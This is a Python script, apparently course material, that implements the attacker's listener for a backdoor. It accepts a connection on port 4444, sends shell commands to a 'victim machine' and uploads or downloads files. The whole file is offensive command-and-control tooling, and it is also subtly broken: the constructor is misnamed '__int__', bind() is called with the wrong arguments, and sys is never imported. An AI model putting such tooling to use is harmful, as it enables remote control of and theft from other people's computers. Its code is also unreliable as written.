#!/usr/bin/env python
import socket, json
import base64

class Listener:
    def __int__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # We created a socket object.
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if connection lost this provides reconnection. #1 in the end means "enable this option."
        listener.bind(ip, port)
        # We are listening incoming connections. Thus we are binding it to our own local address.
        listener.listen(0)
        # We are specifying a backlog value to this method.
        # A backlog is the number of connections that are cued before connections start getting refused.
        self.connection, address = listener.accept()
        # Two values returned(conn, address)
        # conn represents the connection.
        # Accept a connection. The socket must be bound to an address and listening for connections.
        # The return value is a pair (conn, address) where conn is a new socket object usable to send
        # and receive data on the connection, and address is the address bound to the socket
        # on the other end of the connection.
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        # in every loop 1024 byte data will be added to json_data.
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
                # if this is enough it will return, otherwise it will run another loop to complete the packet.
            except ValueError:
                continue



    def execute_remotely(self, command):
        if command == "exit" :
            self.connection.close()
            exit()
            # This exits Python program. But

        self.reliable_send(command)
        return self.reliable_receive()
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
            # if file.read() method returns unknown characters, base64 converts them to known characters.
            # when uploading a file to the victim machine we also need to read files from our own local computer.

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successfull."




    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:

                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "Error during command execution."
            print(result)
try:
    # This prevents sending error messages to the user machine when we are not in the listening mode but backdoor is otherwise working.
    my_listener = Listener("10.0.0.1", 4444)
    my_listener.run()
except Exception:
    sys.exit()


